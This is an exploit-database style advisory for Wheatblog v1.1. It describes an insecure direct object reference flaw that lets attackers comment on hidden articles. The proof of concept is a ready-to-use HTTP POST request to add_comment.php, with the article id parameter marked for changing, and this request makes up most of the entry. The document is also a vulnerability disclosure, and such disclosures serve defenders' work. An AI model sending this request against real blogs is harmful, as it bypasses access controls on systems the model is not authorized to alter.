# Exploit Title: Wheatblog v1.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/wheatblog/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Wheatblog
## Version: v1.1
## Exploit Description:
## Wheatblog v1.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add comment to article that is hidden(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /add_comment.php HTTP/1.1
...

comment_month=01&comment_date=08&comment_year=2024&the_id=2(CHANGE HERE)&comment_author_name=user1&comment_author_email=user1%40test.com&comment_author_url=&comment_body=user1111&captcha=123456
```